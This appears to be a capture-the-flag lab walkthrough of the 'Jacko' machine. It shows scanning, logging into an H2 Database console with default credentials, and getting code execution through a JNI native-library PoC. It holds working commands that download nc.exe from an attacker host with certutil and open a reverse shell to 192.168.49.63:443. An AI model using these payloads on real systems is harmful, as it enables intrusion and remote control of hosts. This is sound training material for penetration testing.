lab Jacko 

target 192.168.63.66

```bash
sudo nmap -sC -sV jacko -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash

PORT      STATE    SERVICE       REASON      VERSION
80/tcp    open     http          syn-ack     Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack
5040/tcp  open     unknown       syn-ack
7680/tcp  open     pando-pub?    syn-ack
8082/tcp  open     http          syn-ack     H2 database http console
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods:
|_  Supported Methods: GET POST
9092/tcp  open     XmlIpcRegSvc? syn-ack
49664/tcp open     unknown       syn-ack
49665/tcp open     unknown       syn-ack
49666/tcp open     unknown       syn-ack
49667/tcp open     unknown       syn-ack
49668/tcp open     unknown       syn-ack
49669/tcp open     unknown       syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

<img width="697" height="24" alt="image" src="https://github.com/user-attachments/assets/24e328f7-6a8c-4e48-a7e4-5be7c9292fc0" />


Since an HTTP service was active, I decided to focus on port 8082 first.

Upon accessing port 8082, it displayed the H2 Database Console login page.
<img width="1150" height="498" alt="image" src="https://github.com/user-attachments/assets/fd853690-178f-4b19-a6b0-bce511833d75" />

I clicked the “Test Connection” button, and the result was “Test successful,” which indicated that the connection could be established using the default username “sa” with no password.

<img width="1144" height="578" alt="image" src="https://github.com/user-attachments/assets/eaec31f2-ef1b-439c-93a9-b8cd87226ba4" />

I then clicked the “Connect” button using the same credentials (sa with no password), and it successfully granted access to the SQL Console 

<img width="1217" height="798" alt="image" src="https://github.com/user-attachments/assets/fd635ca7-983b-49b1-885e-1b4c59f51cac" />

Initial Access:

For this we will be using the following found PoC as a guideline:
<img width="1329" height="277" alt="image" src="https://github.com/user-attachments/assets/c06ad577-2d2c-4891-87dc-347d91069745" />

This PoC mentions first to Write native library, which we will copy paste as follows:
<img width="1308" height="88" alt="image" src="https://github.com/user-attachments/assets/fd30fa04-1ff5-49b6-bac4-09cb3d7c6410" />

You have to copy and paste the giant set of comma-separated bytes into the SQL query box and execute it.

<img width="1445" height="799" alt="image" src="https://github.com/user-attachments/assets/be7c6521-4382-497e-8729-245f144eecf9" />

Next up we press Clear and paste the following part:

<img width="1231" height="608" alt="image" src="https://github.com/user-attachments/assets/001cea36-621b-4c06-9e5e-2d3fcf355abf" />

Now that the Alias is created we copy paste the last step, which executes the whoami command:

<img width="1443" height="595" alt="image" src="https://github.com/user-attachments/assets/923f65e0-116b-46f1-a5d7-fd95fae26d64" />


This returns the jacko\tony user under which the service is running.

Foothold

Now comes the part where we gain our foothold. We will first upload the nc.exe binary so we can then create a reverse shell.

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.63/nc.exe C:\\Users\\tony\\Downloads\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');
```
<img width="1444" height="571" alt="image" src="https://github.com/user-attachments/assets/36bd73e9-2df2-4e0d-b997-78e1570af743" />

before upload the nc.exe binary first Do This Now

On your Kali/attack machine – Verify & Restart HTTP server properly

```bash
ls -l   # Make sure nc.exe is here and named exactly nc.exe (case-sensitive!)
# If not, rename or re-download:
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe   # or your preferred Windows nc.exe
chmod +x nc.exe   # optional, but harmless
python3 -m http.server 80   # run in the folder with nc.exe
```

After uploading, I executed it to connect back to my listener on port 443.

```bash
rlwrap nc -nlvp 443
```
<img width="655" height="103" alt="image" src="https://github.com/user-attachments/assets/50c02a56-68b1-4b9e-bca7-1b22486e2a92" />

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Downloads\\nc.exe 192.168.49.63 443 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```

<img width="1446" height="413" alt="image" src="https://github.com/user-attachments/assets/1b4aef55-fc8d-444e-846e-3cfa077e76d1" />

<img width="1036" height="197" alt="image" src="https://github.com/user-attachments/assets/50c8bbfb-7c9c-4cc1-9509-23d451c51cfe" />

Once I obtained an interactive shell, I attempted to run whoami, but the command (along with several others) failed to execute in that shell environment.

<img width="906" height="152" alt="image" src="https://github.com/user-attachments/assets/ac45ba4d-f7a0-4fe9-be62-ab619d1785e6" />


Privilege Escalation: Abuse SeImpersonatePrivilege

To work around this limitation, I tried executing commands through the web interface — and that worked. It showed that I was operating as user tony, who possesses the SeImpersonatePrivilege.

This privilege can be abused to escalate privileges to SYSTEM, which opened the door for further exploitation.

command:

```bash
CALL JNIScriptEngine_eval(‘new java.util.Scanner(java.lang.Runtime.getRuntime().exec(“whoami /priv”).getInputStream()).useDelimiter(“\\Z”).next()’);
```
<img width="1447" height="250" alt="image" src="https://github.com/user-attachments/assets/638bbb03-8905-432b-897f-55457184e3fd" />

